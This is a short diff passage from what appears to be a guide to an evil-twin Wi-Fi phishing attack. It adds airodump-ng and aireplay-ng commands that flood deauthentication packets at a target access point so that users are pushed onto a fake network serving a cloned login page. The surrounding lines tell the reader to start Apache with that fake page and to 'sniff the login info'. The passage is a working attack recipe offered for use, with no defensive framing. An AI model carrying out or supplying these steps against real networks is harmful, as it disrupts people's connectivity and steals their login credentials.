@@ -365,6 +365,12 @@ start the apache with the fake login page
 service apache2 start
 ```
 - Deauth users to use the fake network with the cloned page.
+```
+Terminal 1
+airodump-ng --bssid (BSSID) --channel (Nº) mon0
+Terminal 2
+aireplay-ng --deauth 10000000 -a (BSSID) mon0
+```
 - Sniff the login info!
 
 <form method="post" action="/index.html"></form>
